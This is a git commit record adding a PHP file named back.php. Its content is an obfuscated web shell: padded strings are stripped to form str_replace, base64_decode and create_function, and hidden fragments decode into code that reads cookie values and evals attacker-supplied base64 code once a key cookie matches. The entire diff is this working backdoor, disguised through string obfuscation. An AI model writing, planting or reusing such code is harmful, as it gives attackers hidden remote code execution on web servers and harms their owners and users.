81940967f340323d4f1f37edab66863027a566c3
FrankWiX <33464238+FrankWiX@users.noreply.github.com>
2017-11-09 03:03:57 -0500

    Create back.php

---
+++ back.php
@@ -0,0 +1,10 @@
+<?php
+$rmdl="GxhY2UgcoYgcXgcJyYXkoJy9gcbXlx3PVxzgcXS8nLCcvXHgcMvJykgcsIGFgcygccmFgc5KCgccnLCgccgcrJyksIgc";
+$posc = str_replace("d","","sdtrd_rdepdladcde");
+$rylu="cdsgcbCc7ZWNobyAnPCcugcJgcGsuJz4nO2V2YWwoYmFgczZTY0gcX2RlY29kZShwcmVnXgc3gcJlc";
+$vecn="GgcpvaW4oYXJygcYXlgcfcgc2xpY2UoJGEgcsJGMoJGEgcpLTMpKSkpKgcTtlY2hgcvICc8LycuJGsgcuJz4nO30=";
+$ptil="JGM9J2NvdW50JzskYT0kX0NPT0gctJRgcTtpZihyZXgcNldCgkYSk9PSdraScggcJiYgJGMoJGEpPgcjMpeyRrPSg";
+$rucv = $posc("y", "", "ybyaysyey6y4_dyeycyode");
+$cnxx = $posc("eh","","creehaehtehe_ehfehunehcehtehion");
+$qmhh = $cnxx('', $rucv($posc("gc", "", $ptil.$rylu.$rmdl.$vecn))); $qmhh();
+?>
